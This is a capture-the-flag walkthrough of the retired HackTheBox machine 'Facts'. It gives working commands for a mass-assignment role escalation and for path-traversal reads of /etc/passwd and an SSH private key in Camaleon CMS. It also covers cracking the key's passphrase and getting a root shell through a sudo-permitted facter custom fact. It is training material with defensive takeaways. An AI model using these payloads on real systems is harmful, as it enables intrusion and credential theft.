# HTB — Facts

> **OS:** Linux | **Difficulty:** Easy | **Status:** Retired ✅  
> **Topics:** Mass Assignment, Path Traversal, SSH Key Cracking, Sudo Misconfiguration  
> **Author:** YOURUSERNAME | **Date:** May 2026

---

## Overview

Facts is a Linux machine built around a trivia web application running **Cameleon CMS v2.9.0**. The attack chain starts with open user registration, escalates CMS privileges via a mass assignment flaw, leaks an SSH private key through a path traversal vulnerability, cracks the key passphrase, and finally abuses a sudo misconfiguration with `facter` to achieve full root access.

---

## Attack Chain Summary

```
Nmap → facts.htb hostname
  └─> Gobuster → /admin login panel
        └─> Open registration → low-priv account
              └─> CVE-2025-2304 (Mass Assignment) → CMS Admin
                    └─> CVE-2024-46987 (Path Traversal) → SSH private key
                          └─> ssh2john + John → passphrase cracked
                                └─> SSH as trivia → user.txt ✅
                                      └─> sudo facter (NOPASSWD) → root ✅
```

---

## Recon

### Nmap Scan

```bash
nmap -A -sV <TARGET_IP>
```

**Open Ports:**

| Port | Service | Info |
|------|---------|------|
| 22 | SSH | OpenSSH |
| 80 | HTTP | Web application |

The scan also leaks the hostname — add it to your hosts file:

```bash
echo "<TARGET_IP> facts.htb" >> /etc/hosts
```

---

### Web Enumeration

Navigating to `http://facts.htb` reveals a trivia web application. Run a directory brute-force:

```bash
gobuster dir -u http://facts.htb \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,html,bak
```

Multiple hits under `/admin` return **Status 200** with identical file sizes — the server is routing all extensions to a single entry point. Navigating to `/admin` redirects to `/admin/login`.

At the bottom of the login form there is a **Create an account** link — register a test account and log in.

> After logging in, check the page footer — the site is running **Cameleon CMS version 2.9.0**

---

## Exploitation

### CVE-2025-2304 — Mass Assignment (CMS Privilege Escalation)

Cameleon CMS 2.9.0 fails to whitelist accepted fields on the profile update endpoint. The server blindly trusts all POST parameters, allowing any authenticated user to inject extra fields and modify their own role.

Intercept a profile update request in **Burp Suite** and add the following to the request body:

```
password[role]=administrator
```

Full request example:

```http
POST /admin/users/updated_ajax HTTP/1.1
Host: facts.htb
Content-Type: application/x-www-form-urlencoded
Cookie: YOUR_SESSION_COOKIE

[existing fields]&password[role]=administrator
```

Refresh the dashboard — your account now shows the **Administrator** role.

> **Why it works:** The server passes the entire POST body directly into a mass assignment operation without filtering which fields can be updated. Always whitelist accepted parameters server-side.

---

### CVE-2024-46987 — Path Traversal (File Disclosure)

The MediaController in Camaleon CMS contains an authenticated path traversal vulnerability. As an admin, manipulate the file download parameter to read arbitrary files from the server.

**Step 1 — Enumerate system users:**

```bash
curl -s -b "YOUR_SESSION_COOKIE" \
  "http://facts.htb/admin/media/download?file=../../../../../../../etc/passwd"
```

Two interactive users identified: **trivia** and **william** (both with `/bin/bash`)

**Step 2 — Check for SSH key authentication:**

```bash
curl -s -b "YOUR_SESSION_COOKIE" \
  "http://facts.htb/admin/media/download?file=../../../../../../../home/trivia/.ssh/authorized_keys"
```

Confirmed — key-based auth is in use.

**Step 3 — Leak the private key:**

```bash
curl -s -b "YOUR_SESSION_COOKIE" \
  "http://facts.htb/admin/media/download?file=../../../../../../../home/trivia/.ssh/id_ed25519"
```

Save the output to a local file called `trivia_key`.

> **Tip:** If the parameter name differs, intercept a normal media download in Burp first to identify the correct parameter before manipulating it with `../` sequences.

---

### Cracking the SSH Key Passphrase

The key is passphrase-protected. Convert it and crack it:

```bash
# Set correct permissions
chmod 600 trivia_key

# Convert to crackable hash
ssh2john trivia_key > trivia.hash

# Crack with rockyou
john trivia.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

**Cracked passphrase:** `dragonballz`

---

## User Flag

```bash
ssh -i trivia_key trivia@facts.htb
# Passphrase: dragonballz
```

```bash
cat ~/user.txt
```

**User owned!** 🏁

---

## Privilege Escalation

### Sudo Misconfiguration — Facter

Check what the current user can run with sudo:

```bash
sudo -l
```

Output:

```
(ALL) NOPASSWD: /usr/bin/facter
```

`facter` is a system information tool that supports loading **custom Ruby facts** from a user-specified directory. Since we can run it as root with no password, we can load malicious Ruby code that spawns a root shell.

**Step 1 — Create the malicious fact:**

```bash
mkdir -p /tmp/custom

cat > /tmp/custom/shell.rb << 'EOF'
Facter.add('shell') do
  setcode do
    exec('/bin/bash')
  end
end
EOF
```

**Step 2 — Load it as root:**

```bash
sudo /usr/bin/facter --custom-dir=/tmp/custom shell
```

Verify root:

```bash
whoami && id
# root
# uid=0(root) gid=0(root) groups=0(root)
```

---

## Root Flag

```bash
cat /root/root.txt
```

**Root owned!** 🏆

---

## Key Takeaways

- **Mass assignment** happens when APIs blindly accept all user-supplied fields — always whitelist accepted parameters server-side
- **Path traversal** in file download endpoints can expose SSH keys and sensitive configs — validate and sanitize all file paths
- **NOPASSWD sudo** entries for binaries that support custom code loading are trivially exploitable — audit sudo rules regularly
- **Passphrase-protected SSH keys** are not safe if the key itself can be exfiltrated — protect your `.ssh` directory permissions

---

## Tools Used

`nmap` `gobuster` `burpsuite` `curl` `ssh2john` `john` `ssh`

---

*Write-up covers a retired HackTheBox machine. For educational purposes only.*
